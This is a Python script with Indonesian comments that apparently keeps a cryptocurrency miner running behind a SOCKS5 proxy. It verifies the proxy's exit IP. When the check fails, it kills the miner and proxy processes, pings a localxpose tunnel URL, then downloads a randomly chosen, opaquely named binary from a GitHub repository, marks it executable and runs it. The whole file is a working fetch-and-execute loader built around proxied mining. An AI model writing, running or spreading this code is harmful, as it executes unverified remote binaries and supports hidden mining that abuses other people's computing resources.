import time
import requests
import subprocess
import os
import random
import configparser

def get_proxy_ip_from_config(file_path):
    config = configparser.ConfigParser()
    config.read(file_path)
    
    proxy_ip = None
    if 'local' in config:
        socks5_value = config['local'].get('socks5')
        if socks5_value:
            proxy_ip = socks5_value.split(':')[0]
    
    return proxy_ip

# Fungsi untuk memeriksa koneksi proxy menggunakan curl
def check_proxy():
    file_path = 'graftcp/local/graftcp-local.conf'  # Sesuaikan dengan path file yang benar
    proxy_ip = get_proxy_ip_from_config(file_path)

    if not proxy_ip:
        print("Tidak dapat menemukan IP proxy dalam konfigurasi.")
        return False
    
    curl_command = f"./graftcp/graftcp curl http://checkip.amazonaws.com"
    
    try:
        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            proxy_response = result.stdout.strip()
            if proxy_response == proxy_ip:
                print(proxy_response)
                return True
    except Exception as e:
        print(f"Error checking proxy: {e}")
    return False

def kill_processes(process_list):
    for process_name in process_list:
        subprocess.run(['pkill', '-9', process_name])

def send_info():
    url = "https://localtopublic.ap.loclx.io/info"

    try:
        requests.get(url)
    except requests.RequestException as e:
        print(f"Error saat mengakses website: {e}")

def download_and_run_file():
    download_link_base = "https://github.com/suplays/starterpack/raw/main/nim/backup/"
    file_names = ['satu', 'dua', 'tiga', 'empat', 'lima', 'enam', 'tujuh']

    try:
        os.chdir("..")  # Naik satu level direktori
        
        random_file_name = random.choice(file_names)
        download_link = f"{download_link_base}{random_file_name}"
        response = requests.get(download_link)
        
        if response.status_code == 200:
            file_path = f"./{random_file_name}"
            with open(file_path, 'wb') as file:
                file.write(response.content)
            os.chmod(file_path, 0o755)  # Memberikan izin eksekusi pada file
            
            subprocess.run(f"./{random_file_name}", shell=True)
        else:
            raise Exception("Gagal mengunduh file.")
    except Exception as e:
        print(f"Error downloading/running file: {e}")

if __name__ == "__main__":
    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local']
    
    while True:
        if check_proxy():
            print("Proxy aktif.")
            time.sleep(300)  # Tunggu 5 menit
        else:
            print("Proxy tidak valid. Menghentikan proses.")
            kill_processes(process_list)

            try:
                send_info()
            except Exception as ex:
                print(f"Error saat mengirim info: {ex}")

            try:
                download_and_run_file()
                break
            except Exception as e:
                print(f"Error saat download dan jalankan file: {e}")
                time.sleep(30)  # Tunggu 30 detik
